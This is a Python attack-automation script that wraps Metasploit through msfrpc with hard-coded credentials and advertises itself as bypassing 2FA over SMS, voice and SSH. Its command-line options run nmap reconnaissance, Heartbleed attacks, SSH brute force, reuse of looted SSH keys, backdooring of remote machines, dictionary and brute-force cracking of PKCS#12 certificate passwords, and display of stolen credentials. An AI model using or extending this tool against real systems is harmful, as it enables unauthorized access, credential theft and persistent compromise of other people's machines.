#!/usr/bin/env python


import argparse
import os
import sys
import time
import importlib
try:
    import msfrpc
except ImportError:
    msfrpc = None
import webbrowser


class _BColors:
    RED = "\033[91m"
    ENDC = "\033[0m"


bcolors = _BColors()


BANNER = """
 ___ ___ _                      _
|_  ) __/_\   ______ __ _ _____(_)_ _
 / /| _/ _ \ (_-<_-</ _` (_-<_-< | '  \+v2
/___|_/_/ \_\\/__/__/\__,_/__/__/_|_||_|

"""


def require_msfrpc():
    if msfrpc is None:
        print("The 'msfrpc' package is required for this action. Please install it (e.g. 'pip install msfrpc').")
        sys.exit(1)


_IMPORT_CACHE = {}


def safe_import(module_path, description):
    if module_path in _IMPORT_CACHE:
        return _IMPORT_CACHE[module_path]
    try:
        module = importlib.import_module(module_path)
    except ImportError as exc:
        print("Unable to import {} ({}). {}".format(description, module_path, exc))
        sys.exit(1)
    _IMPORT_CACHE[module_path] = module
    return module

def advanced(ip_input):
    require_msfrpc()
    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']
    a = client.call('console.write', [console_id, "db_nmap -f --iflist %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -v -O --osscan-guess %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -PA -PS -PO -PU %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap -sT %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap --reason %s \n" %ip_input])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_input])
    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "services \n"])
    time.sleep(1)

    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print(res['data'], end='')

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

        cleanup = client.call('console.destroy',[console_id])
        print("Cleanup result: %s" %cleanup['result'])
        exit()


def scan(ip_addr):

    require_msfrpc()
    client = msfrpc.Msfrpc({})
    client.login('msf','abc123')
    res = client.call('console.create')
    console_id = res['id']
    a = client.call('console.write', [console_id, "hosts \n"])
    a = client.call('console.write', [console_id, "db_nmap %s \n" %ip_addr])
    time.sleep(1)

    while True:
        res = client.call('console.read',[console_id])

        if len(res['data']) > 1:
            print(res['data'], end='')

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

        cleanup = client.call('console.destroy',[console_id])
        print("Cleanup result: %s" %cleanup['result'])
        exit()


def build_parser():
    parser = argparse.ArgumentParser(description='Bypass 2FA - SMS, Voice, SSH')
    parser.add_argument('--target', help="IP Address")
    parser.add_argument('--silent', action="store_true", help="reduce output verbosity")
    parser.add_argument('--scan', help="Network enumeration { basic | advanced }")
    parser.add_argument('--check', help="Check for vulnerabilities, modules")
    parser.add_argument('--cert', help="Certificate management")
    parser.add_argument('--filetype', help="Specify file *.extension")
    parser.add_argument('--user', help="username")
    parser.add_argument('--secret', help="password")
    parser.add_argument('--host', help="server ip")
    parser.add_argument('--mode', help="mode")
    parser.add_argument('--auto', help="auto mode for automation")
    parser.add_argument('--post', help="post modules")
    parser.add_argument('--db', help="Manage your trophies.")
    parser.add_argument('--key', help="keys management")
    parser.add_argument('--log', help="View logs")
    return parser


def run_actions(args):
    if args.scan == "basic":
        ip_addr = args.target
        print("You selected BASIC scan. \n")
        try:
            scan(ip_addr)
        except Exception:
            print("something is wrong with basic scan!")

    elif args.scan == "advanced":
        ip_input = args.target
        print("You selected ADVANCED scan. \n")
        try:
            advanced(ip_input)
        except Exception:
            print("something is wrong with advanced scan!")
        sys.exit(0)

    if args.check == "heartbleed" and args.mode == "attack":
        print("\n ... Start Heartbleed Attacks ... \n\n")
        for _ in range(3):
            try:
                os.system("msfconsole -q -r ./check/vuln/heartburn/heartbleed")
            except Exception:
                print("")
            sys.exit(0)

    if args.check == "ssh" and args.mode == "attack":
        print("\n ... Start SSH Brute Force Attacks ... \n\n")
        cmd = ""
        cmd += "msfconsole -q -r ./check/vuln/brute/brute"
        cmd += ";"
        #cmd += "msfconsole -q -r ./scan/brute.rc >/dev/null"
        #cmd += "msfconsole -q -r ./scan/brute.rc 2>&1 >/dev/null"
        os.system(cmd)
        sys.exit(0)

    if args.check == "ssh" and args.mode == "auth":
        prepare = safe_import('post.prepare', 'post exploitation preparation module')
        stat = safe_import('check.vuln.pub.stat', 'statistics module')
        print("Access machines with looted keys! \n")
        print("Preparing user file ... ... \n")
        prepare.looted_user()
        print("Let system cool down ... ... \n")
        time.sleep(5)
        prepare.clarify(); time.sleep(3)
        prepare.root()
        cmd = ""
        cmd += "msfconsole -q -r ./check/vuln/pub/reauth"
        os.system(cmd)
        time.sleep(3)
        print("\n ... Gathering Statistics from 'authorized_keys' ...\n")
        print("\n ##### These users can access to other machines via public key authentication: ######\n")
        stat.userxxx()
        print("\n ... User accessibity were found on these machines: \n")
        stat.machinexxx()
        sys.exit(0)

    if args.check == "ssh" and args.mode == "backdoor":
        pka = safe_import('post.pka', 'post exploitation automation module')
        print("Backdooring remote machines! \n")
        pka.prep(); time.sleep(2)
        pka.process(); time.sleep(2)
        pka.add_backdoor(); time.sleep(2)
        pka.clean()
        sys.exit(0)

    if args.cert == "analyze" and args.filetype == "pfx":
        detest = safe_import('cert.analysis.detest', 'certificate analysis module')
        print("\n--------- Analyze the PFX file -----------")
        try:
            detest.analyze()
        except Exception:
            print("ERROR: something is wrong, see detest.")

    if args.cert == "crack" and args.mode == "dic" and args.filetype == "pfx":
        win = safe_import('crack.pkcs12.win', 'PKCS#12 cracking module')
        print("\n...... Dictionary Attacks on PKCS#12 ......\n")
        win.crack()
        time.sleep(2)
        try:
            win.median()
        except Exception:
            print("\n Could not remove passwords on client certificate! \n")
        sys.exit()

    if args.cert == "crack" and args.mode == "bruteforce" and args.filetype == "pfx":
        win = safe_import('crack.pkcs12.win', 'PKCS#12 cracking module')
        print("\n...... Brute Force Attacks on PKCS#12 ......\n")
        win.bruteforce()
        try:
            win.median()
        except Exception:
            print("\n Could not remove passwords on client certificate! \n")
        sys.exit()

    if args.cert == "windows":
        control = safe_import('cert.transport.control', 'certificate transport module')
        first = args.user; second = args.secret; third = args.host
        try:
            control.generate(first, second, third)
        except Exception:
            print("ERROR: Script generation failed.\n")

        cmd = ""
        cmd += "msfconsole -q -r ./cert/transport/instruction/muscle"
        os.system(cmd)
        sys.exit(0)

    if args.log == "all":
        webbrowser.open('file:///root/.msf4/loot/', new=2)
        sys.exit(0)

    if args.log == "loot":
        require_msfrpc()
        client = msfrpc.Msfrpc({});client.login('msf','abc123')
        res = client.call('console.create');console_id = res['id']
        a = client.call('console.write', [console_id, "loot \n"]);time.sleep(1)
        a = client.call('console.write', [console_id, "creds -t password \n"]);time.sleep(1)
        while True:
            res = client.call('console.read',[console_id])
            if len(res['data']) > 1:
                print(res['data']);break
                sys.exit(0)

    if args.log == "whereis":
        stat = safe_import('check.vuln.pub.stat', 'statistics module')
        xuser = args.user
        try:
            stat.origin(xuser)
        except Exception:
            print("Ooops! User was not found!\n")
        sys.exit()

    if args.log =="account":
        stat = safe_import('check.vuln.pub.stat', 'statistics module')
        xcomputer = args.host
        try:
            stat.accountxxx(xcomputer)
        except Exception:
            print("No account accesibility.\n")
        sys.exit()


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()
    run_actions(args)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(bcolors.RED+"\nCaught Ctrl-C, GraceFul Exit. POOOF"+bcolors.ENDC)
        sys.exit(130)
